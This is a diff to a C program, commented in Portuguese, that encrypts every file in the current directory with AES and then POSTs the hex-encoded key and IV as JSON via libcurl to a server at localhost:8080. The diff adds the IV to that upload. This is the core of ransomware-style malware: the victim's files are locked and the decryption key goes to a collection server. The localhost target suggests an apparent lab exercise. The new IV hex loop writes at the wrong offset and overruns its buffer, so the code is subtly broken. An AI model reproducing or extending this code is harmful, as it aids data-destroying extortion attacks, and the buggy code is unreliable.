@@ -11,7 +11,7 @@
 #define KEY_SIZE 32
 #define BLOCK_SIZE 16
 
-void post(char *hash)
+void post(char *hash, char *iv)
 {
     CURL *curl;        // handle
     CURLcode response; // codigo de retorno da func curl_easy_perform()
@@ -21,8 +21,8 @@ void post(char *hash)
     curl = curl_easy_init();
     if (curl && hash != NULL)
     {
-        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:8080/"); // configura opções no handle
-        snprintf(json, sizeof(json), "{\"hash\":\"%s\"}", hash);       // construção do json
+        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:8080/");             // configura opções no handle
+        snprintf(json, sizeof(json), "{\"hash\":\"%s\",\"iv\":\"%s\"}", hash, iv); // construção do json
 
         struct curl_slist *headers = NULL;
         headers = curl_slist_append(headers, "Content-Type: application/json");
@@ -133,21 +133,27 @@ int main()
 
     printf("key AES: ");
 
-    char hex_string[KEY_SIZE * 2 + 1] = {0};
+    char hex_key[KEY_SIZE * 2 + 1] = {0};
+    char hex_iv[BLOCK_SIZE * 2 + 1] = {0};
 
     for (int i = 0; i < KEY_SIZE; i++)
     {
-        sprintf(&hex_string[i * 2], "%02x", key[i]);
+        sprintf(&hex_key[i * 2], "%02x", key[i]);
     }
-    printf("Hex string: %s\n", hex_string);
+    printf("Hex string: %s\n", hex_key);
 
+    for (int i = 0; i < BLOCK_SIZE; i++)
+    {
+        sprintf(&hex_iv[i * 2 + 1], "%02x", iv[i]);
+    }
     char target_directory[1024];
 
     getcwd(target_directory, sizeof(target_directory));
 
     printf("%s", target_directory);
     enDire(target_directory, key, iv);
-    post(hex_string);
+    post(hex_key, hex_iv);
+
     return 0;
 }
 
